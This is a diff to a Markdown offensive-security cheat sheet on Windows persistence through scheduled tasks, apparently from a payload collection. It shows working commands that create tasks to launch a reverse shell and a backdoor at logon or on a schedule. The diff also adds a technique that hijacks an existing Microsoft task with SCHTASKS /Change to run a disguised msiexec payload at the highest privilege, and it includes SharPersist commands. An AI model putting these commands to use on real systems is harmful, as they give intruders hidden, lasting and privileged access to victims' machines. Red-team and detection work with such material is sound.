@@ -146,36 +146,38 @@ SharPersist -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -
 
 ### Scheduled Tasks User
 
-Using native **schtask**
+* Using native **schtask** - Create a new task
+    ```powershell
+    # Create the scheduled tasks to run once at 00.00
+    schtasks /create /sc ONCE /st 00:00 /tn "Device-Synchronize" /tr C:\Temp\revshell.exe
+    # Force run it now !
+    schtasks /run /tn "Device-Synchronize"
+    ```
+* Using native **schtask** - Leverage the `schtasks /change` command to modify existing scheduled tasks
+    ```powershell
+    # Launch an executable by calling the ShellExec_RunDLL function.
+    SCHTASKS /Change /tn "\Microsoft\Windows\PLA\Server Manager Performance Monitor" /TR "C:\windows\system32\rundll32.exe SHELL32.DLL,ShellExec_RunDLLA C:\windows\system32\msiexec.exe /Z c:\programdata\S-1-5-18.dat" /RL HIGHEST /RU "" /ENABLE
+    ```
 
-```powershell
-# Create the scheduled tasks to run once at 00.00
-schtasks /create /sc ONCE /st 00:00 /tn "Device-Synchronize" /tr C:\Temp\revshell.exe
-# Force run it now !
-schtasks /run /tn "Device-Synchronize"
-```
+* Using Powershell
+    ```powershell
+    PS C:\> $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Users\Rasta\AppData\Local\Temp\backdoor.exe"
+    PS C:\> $T = New-ScheduledTaskTrigger -AtLogOn -User "Rasta"
+    PS C:\> $P = New-ScheduledTaskPrincipal "Rasta"
+    PS C:\> $S = New-ScheduledTaskSettingsSet
+    PS C:\> $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
+    PS C:\> Register-ScheduledTask Backdoor -InputObject $D
+    ```
 
-Using Powershell
+* Using SharPersist
+    ```powershell
+    # Add to a current scheduled task
+    SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add
 
-```powershell
-PS C:\> $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Users\Rasta\AppData\Local\Temp\backdoor.exe"
-PS C:\> $T = New-ScheduledTaskTrigger -AtLogOn -User "Rasta"
-PS C:\> $P = New-ScheduledTaskPrincipal "Rasta"
-PS C:\> $S = New-ScheduledTaskSettingsSet
-PS C:\> $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
-PS C:\> Register-ScheduledTask Backdoor -InputObject $D
-```
-
-Using SharPersist
-
-```powershell
-# Add to a current scheduled task
-SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add
-
-# Add new task
-SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add
-SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add -o hourly
-```
+    # Add new task
+    SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add
+    SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add -o hourly
+    ```
 
 
 ### BITS Jobs
